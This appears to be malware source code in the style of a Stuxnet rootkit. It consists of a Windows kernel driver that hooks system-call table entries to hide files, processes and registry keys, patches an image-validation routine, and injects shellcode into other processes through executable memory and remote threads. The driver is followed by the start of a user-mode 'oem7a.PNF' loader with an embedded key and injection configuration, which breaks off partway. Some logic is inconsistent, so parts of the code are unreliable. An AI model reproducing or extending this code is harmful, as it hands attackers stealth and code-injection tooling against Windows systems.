    RtlInitUnicodeString(&ustrName, L"ZwFreeVirtualMemory");
    g_pDeviceExtension->pZwFreeVirtualMemory = (PFN_ZwFreeVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwWriteVirtualMemory");
    g_pDeviceExtension->pZwWriteVirtualMemory = (PFN_ZwWriteVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwReadVirtualMemory");
    g_pDeviceExtension->pZwReadVirtualMemory = (PFN_ZwReadVirtualMemory)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwQueryInformationProcess");
    g_pDeviceExtension->pZwQueryInformationProcess = (PFN_ZwQueryInformationProcess)MmGetSystemRoutineAddress(&ustrName);
    RtlInitUnicodeString(&ustrName, L"ZwCreateThreadEx");
    g_pDeviceExtension->pZwCreateThreadEx = (PFN_ZwCreateThreadEx)MmGetSystemRoutineAddress(&ustrName);
    if (!g_pDeviceExtension->pZwProtectVirtualMemory ||
        !g_pDeviceExtension->pZwAllocateVirtualMemory ||
        !g_pDeviceExtension->pZwFreeVirtualMemory ||
        !g_pDeviceExtension->pZwWriteVirtualMemory ||
        !g_pDeviceExtension->pZwReadVirtualMemory ||
        !g_pDeviceExtension->pZwQueryInformationProcess) {
        return STATUS_UNSUCCESSFUL;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_InstallHooks(VOID) {
    NTSTATUS status;
    PVOID pFunc;
    KIRQL oldIrql;
    if (!g_pDeviceExtension) return STATUS_UNSUCCESSFUL;
    if (g_pDeviceExtension->bHooksInstalled) {
        return STATUS_SUCCESS;
    }
    status = JmiDebs_GetSSDT();
    if (!NT_SUCCESS(status)) {
        return status;
    }
    JmiDebs_InitSSDTIndices();
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQueryDirectoryFile", .Length = 40, .MaximumLength = 40});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQueryDirectoryFile = (PFN_NtQueryDirectoryFile)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQuerySystemInformation", .Length = 46, .MaximumLength = 46});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQuerySystemInformation = (PFN_NtQuerySystemInformation)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtEnumerateKey", .Length = 28, .MaximumLength = 28});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtEnumerateKey = (PFN_NtEnumerateKey)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtQueryValueKey", .Length = 30, .MaximumLength = 30});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtQueryValueKey = (PFN_NtQueryValueKey)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtOpenProcess", .Length = 26, .MaximumLength = 26});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtOpenProcess = (PFN_NtOpenProcess)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"NtCreateFile", .Length = 26, .MaximumLength = 26});
    if (pFunc) {
        g_pDeviceExtension->pOriginalNtCreateFile = (PFN_NtCreateFile)pFunc;
    }
    pFunc = MmGetSystemRoutineAddress(&(UNICODE_STRING){.Buffer = L"SeValidateImageHeader", .Length = 40, .MaximumLength = 40});
    if (pFunc) {
        g_pDeviceExtension->pOriginalSeValidateImageHeader = (PFN_SeValidateImageHeader)pFunc;
    }
    if (!g_pDeviceExtension->pOriginalNtQueryDirectoryFile ||
        !g_pDeviceExtension->pOriginalNtQuerySystemInformation ||
        !g_pDeviceExtension->pOriginalNtEnumerateKey ||
        !g_pDeviceExtension->pOriginalNtQueryValueKey ||
        !g_pDeviceExtension->pOriginalNtOpenProcess ||
        !g_pDeviceExtension->pOriginalNtCreateFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = JmiDebs_GetNtImports();
    if (!NT_SUCCESS(status)) {
        return status;
    }
    oldIrql = KeRaiseIrqlToDpcLevel();
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile] = (PVOID)JmiDebs_Hook_NtQueryDirectoryFile;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation] = (PVOID)JmiDebs_Hook_NtQuerySystemInformation;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey] = (PVOID)JmiDebs_Hook_NtEnumerateKey;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey] = (PVOID)JmiDebs_Hook_NtQueryValueKey;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtOpenProcess] = (PVOID)JmiDebs_Hook_NtOpenProcess;
    g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtCreateFile] = (PVOID)JmiDebs_Hook_NtCreateFile;
    KeLowerIrql(oldIrql);
    if (g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        oldIrql = KeRaiseIrqlToDpcLevel();
        *(PVOID*)g_pDeviceExtension->pOriginalSeValidateImageHeader = (PVOID)JmiDebs_Hook_SeValidateImageHeader;
        KeLowerIrql(oldIrql);
    }
    g_pDeviceExtension->bHooksInstalled = TRUE;
    g_pDeviceExtension->ulInfoCount++;
    return STATUS_SUCCESS;
}

static VOID JmiDebs_UninstallHooks(VOID) {
    KIRQL oldIrql;
    if (!g_pDeviceExtension || !g_pDeviceExtension->bHooksInstalled || !g_pDeviceExtension->pServiceDescriptorTable) {
        return;
    }
    oldIrql = KeRaiseIrqlToDpcLevel();
    if (g_pDeviceExtension->pOriginalNtQueryDirectoryFile) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryDirectoryFile] = (PVOID)g_pDeviceExtension->pOriginalNtQueryDirectoryFile;
    }
    if (g_pDeviceExtension->pOriginalNtQuerySystemInformation) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQuerySystemInformation] = (PVOID)g_pDeviceExtension->pOriginalNtQuerySystemInformation;
    }
    if (g_pDeviceExtension->pOriginalNtEnumerateKey) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtEnumerateKey] = (PVOID)g_pDeviceExtension->pOriginalNtEnumerateKey;
    }
    if (g_pDeviceExtension->pOriginalNtQueryValueKey) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtQueryValueKey] = (PVOID)g_pDeviceExtension->pOriginalNtQueryValueKey;
    }
    if (g_pDeviceExtension->pOriginalNtOpenProcess) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtOpenProcess] = (PVOID)g_pDeviceExtension->pOriginalNtOpenProcess;
    }
    if (g_pDeviceExtension->pOriginalNtCreateFile) {
        g_pDeviceExtension->pServiceDescriptorTable->ntoskrnl.ServiceTableBase[g_pDeviceExtension->ulSSDTIndex_NtCreateFile] = (PVOID)g_pDeviceExtension->pOriginalNtCreateFile;
    }
    if (g_pDeviceExtension->pOriginalSeValidateImageHeader) {
        *(PVOID*)g_pDeviceExtension->pOriginalSeValidateImageHeader = (PVOID)g_pDeviceExtension->pOriginalSeValidateImageHeader;
    }
    KeLowerIrql(oldIrql);
    g_pDeviceExtension->bHooksInstalled = FALSE;
    g_pDeviceExtension->ulInfoCount++;
}

static NTSTATUS JmiDebs_InjectIntoProcess(HANDLE ProcessId, PVOID pBuffer, SIZE_T BufferSize) {
    NTSTATUS status;
    HANDLE hProcess;
    PEPROCESS pProcess;
    PVOID pAllocAddress;
    SIZE_T RegionSize;
    ULONG OldProtect;
    if (!g_pDeviceExtension || !ProcessId || !pBuffer || BufferSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    status = PsLookupProcessByProcessId(ProcessId, &pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = ObOpenObjectByPointer(pProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    ObDereferenceObject(pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pAllocAddress = NULL;
    RegionSize = BufferSize;
    status = g_pDeviceExtension->pZwAllocateVirtualMemory(
        hProcess,
        &pAllocAddress,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwWriteVirtualMemory(
        hProcess,
        pAllocAddress,
        pBuffer,
        BufferSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwProtectVirtualMemory(
        hProcess,
        &pAllocAddress,
        &RegionSize,
        PAGE_EXECUTE_READWRITE,
        &OldProtect
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    ZwClose(hProcess);
    g_pDeviceExtension->ulProcessInjectionCount++;
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_InjectShellcode(HANDLE ProcessId, PVOID pShellcode, SIZE_T ShellcodeSize) {
    NTSTATUS status;
    HANDLE hProcess;
    PEPROCESS pProcess;
    PVOID pAllocAddress;
    SIZE_T RegionSize;
    ULONG OldProtect;
    HANDLE hThread;
    if (!g_pDeviceExtension || !ProcessId || !pShellcode || ShellcodeSize == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    status = PsLookupProcessByProcessId(ProcessId, &pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    status = ObOpenObjectByPointer(pProcess, OBJ_KERNEL_HANDLE, NULL, PROCESS_ALL_ACCESS, *PsProcessType, KernelMode, &hProcess);
    ObDereferenceObject(pProcess);
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pAllocAddress = NULL;
    RegionSize = ShellcodeSize;
    status = g_pDeviceExtension->pZwAllocateVirtualMemory(
        hProcess,
        &pAllocAddress,
        0,
        &RegionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwWriteVirtualMemory(
        hProcess,
        pAllocAddress,
        pShellcode,
        ShellcodeSize,
        NULL
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwProtectVirtualMemory(
        hProcess,
        &pAllocAddress,
        &RegionSize,
        PAGE_EXECUTE_READWRITE,
        &OldProtect
    );
    if (!NT_SUCCESS(status)) {
        g_pDeviceExtension->pZwFreeVirtualMemory(hProcess, &pAllocAddress, &RegionSize, MEM_RELEASE);
        ZwClose(hProcess);
        return status;
    }
    status = g_pDeviceExtension->pZwCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        pAllocAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );
    if (NT_SUCCESS(status)) {
        ZwClose(hThread);
        g_pDeviceExtension->ulProcessInjectionCount++;
    }
    ZwClose(hProcess);
    return status;
}

static NTSTATUS JmiDebs_DeviceControl(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    PIO_STACK_LOCATION pStack;
    NTSTATUS status;
    ULONG ulIoControlCode;
    PVOID pInputBuffer;
    PVOID pOutputBuffer;
    ULONG ulInputBufferLength;
    ULONG ulOutputBufferLength;
    if (!pDeviceObject || !pIrp) {
        return STATUS_INVALID_PARAMETER;
    }
    pStack = IoGetCurrentIrpStackLocation(pIrp);
    ulIoControlCode = pStack->Parameters.DeviceIoControl.IoControlCode;
    pInputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    pOutputBuffer = pIrp->AssociatedIrp.SystemBuffer;
    ulInputBufferLength = pStack->Parameters.DeviceIoControl.InputBufferLength;
    ulOutputBufferLength = pStack->Parameters.DeviceIoControl.OutputBufferLength;
    status = STATUS_SUCCESS;
    if (!g_pDeviceExtension) {
        status = STATUS_UNSUCCESSFUL;
        goto CompleteRequest;
    }
    g_pDeviceExtension->ulIoControlCount++;
    switch (ulIoControlCode) {
        case JMIDEBS_IOCTL_INSTALL_HOOKS:
            status = JmiDebs_InstallHooks();
            break;
        case JMIDEBS_IOCTL_UNINSTALL_HOOKS:
            JmiDebs_UninstallHooks();
            status = STATUS_SUCCESS;
            break;
        case JMIDEBS_IOCTL_HIDE_PROCESS:
            if (pInputBuffer && ulInputBufferLength >= sizeof(HANDLE)) {
                HANDLE ProcessId = *(PHANDLE)pInputBuffer;
                status = JmiDebs_InjectIntoProcess(ProcessId, NULL, 0);
            } else {
                status = STATUS_INVALID_PARAMETER;
            }
            break;
        case JMIDEBS_IOCTL_GET_STATUS:
            if (pOutputBuffer && ulOutputBufferLength >= sizeof(ULONG)) {
                *(PULONG)pOutputBuffer = g_pDeviceExtension->bHooksInstalled ? 1 : 0;
                status = STATUS_SUCCESS;
            } else {
                status = STATUS_BUFFER_TOO_SMALL;
            }
            break;
        default:
            status = STATUS_INVALID_PARAMETER;
            break;
    }
CompleteRequest:
    pIrp->IoStatus.Status = status;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return status;
}

static NTSTATUS JmiDebs_DispatchCreate(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_DispatchClose(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_DispatchReadWrite(
    PDEVICE_OBJECT pDeviceObject,
    PIRP pIrp
) {
    if (!pIrp) return STATUS_INVALID_PARAMETER;
    pIrp->IoStatus.Status = STATUS_SUCCESS;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

static NTSTATUS JmiDebs_CreateDevice(
    PDRIVER_OBJECT pDriverObject,
    PJMIDEBS_DEVICE_EXTENSION pDeviceExtension
) {
    NTSTATUS status;
    UNICODE_STRING ustrDeviceName;
    UNICODE_STRING ustrSymbolicName;
    PDEVICE_OBJECT pDeviceObject;
    if (!pDriverObject || !pDeviceExtension) {
        return STATUS_INVALID_PARAMETER;
    }
    RtlInitUnicodeString(&ustrDeviceName, JMIDEBS_DEVICE_NAME);
    RtlInitUnicodeString(&ustrSymbolicName, JMIDEBS_SYMLINK_NAME);
    status = IoCreateDevice(
        pDriverObject,
        sizeof(JMIDEBS_DEVICE_EXTENSION),
        &ustrDeviceName,
        FILE_DEVICE_UNKNOWN,
        0,
        FALSE,
        &pDeviceObject
    );
    if (!NT_SUCCESS(status)) {
        return status;
    }
    pDeviceObject->Flags |= DO_BUFFERED_IO;
    pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;
    status = IoCreateSymbolicLink(&ustrSymbolicName, &ustrDeviceName);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(pDeviceObject);
        return status;
    }
    pDeviceExtension->pDeviceObject = pDeviceObject;
    pDeviceExtension->bInitialized = TRUE;
    return STATUS_SUCCESS;
}

static VOID JmiDebs_DeleteDevice(
    PDRIVER_OBJECT pDriverObject
) {
    UNICODE_STRING ustrSymbolicName;
    if (!pDriverObject) return;
    RtlInitUnicodeString(&ustrSymbolicName, JMIDEBS_SYMLINK_NAME);
    IoDeleteSymbolicLink(&ustrSymbolicName);
    if (pDriverObject->DeviceObject) {
        IoDeleteDevice(pDriverObject->DeviceObject);
    }
}

static VOID JmiDebs_Unload(
    PDRIVER_OBJECT pDriverObject
) {
    if (!pDriverObject) return;
    if (g_pDeviceExtension) {
        JmiDebs_UninstallHooks();
        KeSetEvent(&g_pDeviceExtension->UnloadEvent, IO_NO_INCREMENT, FALSE);
    }
    JmiDebs_DeleteDevice(pDriverObject);
    if (g_pDeviceExtension) {
        ExFreePoolWithTag(g_pDeviceExtension, JMIDEBS_POOL_TAG);
        g_pDeviceExtension = NULL;
    }
    g_pDriverObject = NULL;
}

static NTSTATUS JmiDebs_DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    NTSTATUS status;
    ULONG i;
    if (!pDriverObject || !pRegistryPath) {
        return STATUS_INVALID_PARAMETER;
    }
    g_pDriverObject = pDriverObject;
    g_pDeviceExtension = (PJMIDEBS_DEVICE_EXTENSION)ExAllocatePoolWithTag(
        NonPagedPool,
        sizeof(JMIDEBS_DEVICE_EXTENSION),
        JMIDEBS_POOL_TAG
    );
    if (!g_pDeviceExtension) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    RtlZeroMemory(g_pDeviceExtension, sizeof(JMIDEBS_DEVICE_EXTENSION));
    status = JmiDebs_CreateDevice(pDriverObject, g_pDeviceExtension);
    if (!NT_SUCCESS(status)) {
        ExFreePoolWithTag(g_pDeviceExtension, JMIDEBS_POOL_TAG);
        g_pDeviceExtension = NULL;
        return status;
    }
    KeInitializeSpinLock(&g_pDeviceExtension->SpinLock);
    KeInitializeEvent(&g_pDeviceExtension->LoadEvent, NotificationEvent, FALSE);
    KeInitializeEvent(&g_pDeviceExtension->UnloadEvent, NotificationEvent, FALSE);
    JmiDebs_InitHiddenLists();
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        pDriverObject->MajorFunction[i] = JmiDebs_DispatchReadWrite;
    }
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = JmiDebs_DispatchCreate;
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = JmiDebs_DispatchClose;
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = JmiDebs_DeviceControl;
    pDriverObject->DriverUnload = JmiDebs_Unload;
    status = JmiDebs_InstallHooks();
    if (!NT_SUCCESS(status)) {
        JmiDebs_Unload(pDriverObject);
        return status;
    }
    g_pDeviceExtension->ulInfoCount++;
    KeSetEvent(&g_pDeviceExtension->LoadEvent, IO_NO_INCREMENT, FALSE);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(
    PDRIVER_OBJECT pDriverObject,
    PUNICODE_STRING pRegistryPath
) {
    return JmiDebs_DriverEntry(pDriverObject, pRegistryPath);
}
END

oem7a.PNF:
#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define OEM7A_MAGIC                     0x4F454D37
#define OEM7A_VERSION                   0x00010400
#define OEM7A_PNF_SIZE                  498176
#define OEM7A_MAX_PATH                  260
#define OEM7A_BUFFER_SIZE               4096
#define OEM7A_SECTION_STUB              ".stub"
#define OEM7A_RESOURCE_MAIN_DLL         1
#define OEM7A_ENCRYPTION_KEY            0x01AE0000
#define OEM7A_DECRYPTION_ROUNDS         3
#define OEM7A_PE_LOADER_SIZE            0x101C

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xC0000004L)

#define NtCurrentProcess()              ((HANDLE)(LONG_PTR)-1)

typedef struct _OEM7A_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwEncryptedSize;
    DWORD dwDecryptedSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwReserved[8];
} OEM7A_HEADER, * POEM7A_HEADER;

typedef struct _OEM7A_INJECTION_ELEMENT {
    DWORD dwReserved1;
    WORD  wExportFunction;
    WORD  wFlags;
    DWORD dwKey;
    DWORD dwReserved2;
    DWORD dwProcessNameLength;
    WCHAR wszProcessName[64];
    DWORD dwFileNameLength;
    WCHAR wszFileName[64];
} OEM7A_INJECTION_ELEMENT, * POEM7A_INJECTION_ELEMENT;

typedef struct _OEM7A_DRIVER_CONFIG {
    DWORD dwNumberOfInjections;
    OEM7A_INJECTION_ELEMENT Elements[16];
} OEM7A_DRIVER_CONFIG, * POEM7A_DRIVER_CONFIG;

typedef struct _OEM7A_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[OEM7A_MAX_PATH];
    WCHAR szSystemPath[OEM7A_MAX_PATH];
    WCHAR szWindowsPath[OEM7A_MAX_PATH];
    WCHAR szInfPath[OEM7A_MAX_PATH];
    WCHAR szPNFPath[OEM7A_MAX_PATH];
    BYTE bReserved[256];
} OEM7A_CTX, * POEM7A_CTX;

typedef struct _OEM7A_PE_LOADER_CTX {
    PVOID pImageBase;
    DWORD dwImageSize;
    DWORD dwEntryPoint;
    PVOID pLoadLibraryA;
    PVOID pGetProcAddress;
    PVOID pVirtualAlloc;
    PVOID pVirtualFree;
    PVOID pExitProcess;
    DWORD dwRelocDelta;
    BOOL bIs64Bit;
    BYTE bReserved[128];
} OEM7A_PE_LOADER_CTX, * POEM7A_PE_LOADER_CTX;

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *PFN_NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *PFN_NtClose)(HANDLE Handle);

typedef NTSTATUS (NTAPI *PFN_ZwQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_ZwAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_ZwWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_ZwProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *PFN_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *PFN_ZwClose)(HANDLE Handle);

static OEM7A_CTX g_Oem7aCtx;
static BOOL g_bInitialized = FALSE;
static PFN_NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static PFN_NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
static PFN_NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
static PFN_NtCreateThreadEx pNtCreateThreadEx = NULL;
static PFN_NtClose pNtClose = NULL;
static PFN_ZwAllocateVirtualMemory pZwAllocateVirtualMemory = NULL;
static PFN_ZwWriteVirtualMemory pZwWriteVirtualMemory = NULL;
static PFN_ZwProtectVirtualMemory pZwProtectVirtualMemory = NULL;
static PFN_ZwCreateThreadEx pZwCreateThreadEx = NULL;
static PFN_ZwClose pZwClose = NULL;

static DWORD g_dwInfectionCount = 0;
static DWORD g_dwInjectionCount = 0;
static DWORD g_dwDecryptionCount = 0;
static DWORD g_dwPELoadCount = 0;

static OEM7A_DRIVER_CONFIG g_DriverConfig = {0};

static BYTE g_EncryptionKey[32] = {
    0x7C, 0x4B, 0x3D, 0x2A, 0x9E, 0xF1, 0x8C, 0x57,
    0x3A, 0x6D, 0x82, 0x19, 0xE4, 0x5F, 0x0B, 0x26,
    0x91, 0x3E, 0x7A, 0x4F, 0xC2, 0x5D, 0x18, 0x63,
    0x8F, 0x2C, 0x79, 0x16, 0x4E, 0xA5, 0x3B, 0xE0
};

static BYTE g_PELoaderStub[OEM7A_PE_LOADER_SIZE] = {0};

static BOOL OEM7A_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    pNtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtClose = (PFN_NtClose)GetProcAddress(hNtdll, "NtClose");
    pZwAllocateVirtualMemory = (PFN_ZwAllocateVirtualMemory)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
    pZwWriteVirtualMemory = (PFN_ZwWriteVirtualMemory)GetProcAddress(hNtdll, "ZwWriteVirtualMemory");
    pZwProtectVirtualMemory = (PFN_ZwProtectVirtualMemory)GetProcAddress(hNtdll, "ZwProtectVirtualMemory");
    pZwCreateThreadEx = (PFN_ZwCreateThreadEx)GetProcAddress(hNtdll, "ZwCreateThreadEx");
    pZwClose = (PFN_ZwClose)GetProcAddress(hNtdll, "ZwClose");
    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtProtectVirtualMemory ||
        !pNtCreateThreadEx || !pNtClose) {
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM7A_Init(VOID) {
    DWORD dwMajor, dwMinor, dwBuild;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Oem7aCtx, sizeof(OEM7A_CTX));
    g_Oem7aCtx.dwMagic = OEM7A_MAGIC;
    g_Oem7aCtx.dwVersion = OEM7A_VERSION;
    g_Oem7aCtx.dwPid = GetCurrentProcessId();
    g_Oem7aCtx.dwTid = GetCurrentThreadId();
    g_Oem7aCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Oem7aCtx.csLock);
    GetModuleFileNameW(NULL, g_Oem7aCtx.szModulePath, OEM7A_MAX_PATH);
    GetSystemDirectoryW(g_Oem7aCtx.szSystemPath, OEM7A_MAX_PATH);
